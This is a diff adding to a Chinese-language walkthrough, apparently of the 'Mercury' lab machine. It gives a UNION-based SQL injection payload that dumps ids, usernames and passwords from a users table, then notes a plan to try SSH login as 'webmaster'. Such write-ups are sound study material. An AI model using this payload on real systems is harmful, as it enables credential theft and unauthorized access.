@@ -91,3 +91,11 @@ gobuster dir -u "http://192.168.174.135:8080" -w "/usr/share/wordlists/dirbuster
 ![image-20260526214521492](Mercury.assets/image-20260526214521492.png)
 
 三列，分别是'id','password','username'
+
+```
+1 union select concat(id,':',username,'=',password) from users;--+
+```
+
+![image-20260526215440563](Mercury.assets/image-20260526215440563.png)
+
+感觉这个webmaster最可疑，先尝试ssh登录这个
